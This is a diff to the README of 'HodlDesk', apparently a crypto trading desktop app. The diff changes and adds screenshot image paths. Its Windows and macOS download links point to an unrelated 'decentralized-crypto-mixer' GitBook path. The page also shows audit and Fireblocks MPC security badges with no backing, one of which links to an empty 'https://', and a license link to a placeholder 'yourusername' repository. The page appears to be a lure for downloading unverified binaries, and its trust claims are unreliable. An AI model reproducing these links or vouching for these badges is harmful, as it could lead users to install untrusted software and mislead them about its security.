@@ -5,13 +5,15 @@ We propose “HodlDesk”, a cross-platform macOS/Windows desktop application ta
 [![Audited by OpenZeppelin](https://img.shields.io/badge/Audit-OpenZeppelin-green)](https://openzeppelin.com)
 [![MPC Wallet Support](https://img.shields.io/badge/Security-Fireblocks%20MPC-blue)](https://)
 
-<p align="center"><img width="700" height="500" src="btc/gui.jpg" alt="Bot interface" /></p>
+<p align="center"><img width="700" height="500" src="hodldesk/trading.png" alt="Bot interface" /></p>
 
 # Download
 ### **Download** [Windows](https://selenium-finance.gitbook.io/decentralized-crypto-mixer/download/windows) / [macOS](https://selenium-finance.gitbook.io/decentralized-crypto-mixer/download/macos)
 
 # Docs 
 ### [**Documentation**](https://selenium-finance.gitbook.io/secure-bitcoin-trading)
+
+<p align="center"><img width="700" height="500" src="hodldesk/trading1.png" alt="Bot interface" /></p>
 
 [![License](https://img.shields.io/badge/License-MIT-green)](https://github.com/yourusername/defi-algo-bot)
 [![Python](https://img.shields.io/badge/Python-3.10%2B-blue)](https://www.python.org)
